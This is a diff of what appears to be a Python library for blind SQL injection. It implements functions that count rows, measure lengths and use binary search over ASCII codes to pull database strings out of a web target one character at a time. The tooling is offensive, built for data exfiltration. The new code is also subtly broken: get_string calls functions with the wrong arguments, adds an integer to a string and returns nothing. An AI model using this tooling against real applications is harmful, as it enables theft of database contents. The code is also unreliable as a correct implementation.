@@ -24,7 +24,8 @@ def blind_query(
     sqli_truth_condition:Callable[[requests.models.Response], bool],
     url:str,
     base_query:Callable[[str],str],
-    sub_query:str, ordinal:str="",
+    sub_query:str, 
+    ordinal:str="",
     query_encoder:Callable[[str], str]=None,
     comment:str = "%23",
     debug:bool=False
@@ -48,10 +49,11 @@ def question(
     url:str,
     base_query:Callable[[str],str],
     sub_query: str, 
+    ordinal:str="",
     query_encoder:Callable[[str], str]=None,
     comment:str="",
     debug:bool=False):
-    return blind_query(req=req, sqli_truth_condition=sqli_truth_condition, url=url, base_query=base_query, sub_query=sub_query, query_encoder=query_encoder,comment=comment, debug=debug)
+    return blind_query(req=req, sqli_truth_condition=sqli_truth_condition, url=url, base_query=base_query, sub_query=sub_query, ordinal=ordinal, query_encoder=query_encoder,comment=comment, debug=debug)
 
 def get_length(
     req:Callable[[requests.models.Response],str],
@@ -66,44 +68,63 @@ def get_length(
     debug:bool=False
     ):
     for i in range(lower_bound, upper_bound):
-        if(question(req=req, sqli_truth_condition=sqli_truth_condition,url=url, base_query=base_query, sub_query=sub_query, query_encoder=query_encoder, comment=comment, debug=debug)):
+        if(question(req=req, sqli_truth_condition=sqli_truth_condition,url=url, base_query=base_query, sub_query=sub_query, ordinal=str(i), query_encoder=query_encoder, comment=comment, debug=debug)):
             return i
 
 
 def get_count(
+    req:Callable[[requests.models.Response],str],
+    sqli_truth_condition:Callable[[requests.models.Response], bool],
     url:str,
     base_query:Callable[[str],str],
     sub_query: str,
-    sqli_truth_condition:Callable[[requests.models.Response], bool],
     lower_bound: int = 0,
     upper_bound: int = 1000,
     query_encoder:Callable[[str], str]=None,
     comment:str = "",
     debug:bool=False):
-    pass
+    for i in range(lower_bound, upper_bound):
+        if(question(req=req, sqli_truth_condition=sqli_truth_condition,url=url, base_query=base_query, sub_query=sub_query, ordinal=str(i), query_encoder=query_encoder, comment=comment, debug=debug)):
+            return i
 def binary_search(
+    req:Callable[[requests.models.Response],str],
+    sqli_truth_condition:Callable[[requests.models.Response], bool],
     url:str,
     base_query:Callable[[str],str],
-    sub_query: str,
-    sqli_truth_condition:Callable[[requests.models.Response], bool],
+    outer_query:Callable[[str,str,str],str],
+    inner_query: str,
+    pos:int,
     lo:int,
     hi:int,
-    position:str,
     query_encoder:Callable[[str], str]=None,
     comment:str = "",
     debug:bool=False):
-    pass
+    while lo <= hi:
+        mid = lo + (hi - lo) // 2
+        sub_query = outer_query(inner_query, pos, mid) # see QUERIES['STR_EXFIL']
+        ans = question(req=req, sqli_truth_condition=sqli_truth_condition,url=url, base_query=base_query, sub_query=sub_query, ordinal=str(mid), query_encoder=query_encoder, comment=comment, debug=debug)
+        if (ans):
+            lo = mid + 1
+        else:
+            hi = mid - 1
+    return lo
 def get_string(
+    req:Callable[[requests.models.Response],str],
+    sqli_truth_condition:Callable[[requests.models.Response], bool],
     url:str,
     base_query:Callable[[str],str],
-    sub_query: str,
-    sqli_truth_condition:Callable[[requests.models.Response], bool],
+    outer_query:Callable[[str,str,str],str],
+    inner_query: str,
     strlen:int,
     query_encoder:Callable[[str], str]=None, 
     comment:str = "", 
     debug:bool=False
     ):
-    pass
+    s = ''
+    for i in range(1, strlen + 1):
+        sub_query = outer_query(inner_query)
+        s += binary_search(req=req, sqli_truth_condition=sqli_truth_condition,url=url, base_query=base_query, sub_query=sub_query, pos=i, lo=32, hi=126, query_encoder=query_encoder, comment=comment, debug=debug)
+        
 def report(
     url:str,
     base_query:Callable[[str],str],
